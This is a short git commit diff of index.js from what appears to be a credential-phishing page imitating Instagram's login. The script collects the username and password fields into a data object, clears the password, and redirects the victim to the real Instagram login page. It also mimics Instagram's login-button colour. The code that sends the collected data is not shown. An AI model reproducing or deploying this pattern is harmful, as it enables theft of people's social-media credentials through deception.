0bec87f736cb8d7c7b6aa4dd67ea629d9df27aff
SinghInder101 <inderbirsingh03@gmail.com>
2021-07-14 17:25:29 +0530

    branch final

--- index.js
+++ index.js
@@ -1,6 +1,10 @@
-  async function x (){
-let username = document.getElementById("user");
-let password = document.getElementById("pass");
+let username = document.getElementById('username');
+let password = document.getElementById('password');
+
+async function x (){
+    // let j = document.getElementById('username');
+    // let z = document.getElementById('password');
+
 
 const data = {
     "username" : username.value,
@@ -26,4 +30,15 @@ password.value="";
 window.location.href="https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav";
 
 
+}
+
+function a(){
+  if(password.value.length<8 ){
+    document.getElementById('lgn').style.backgroundColor='#B2DFFC'
+    
+  }
+  else{
+    document.getElementById('lgn').style.backgroundColor='#3897f0'
+    
+  }
 }
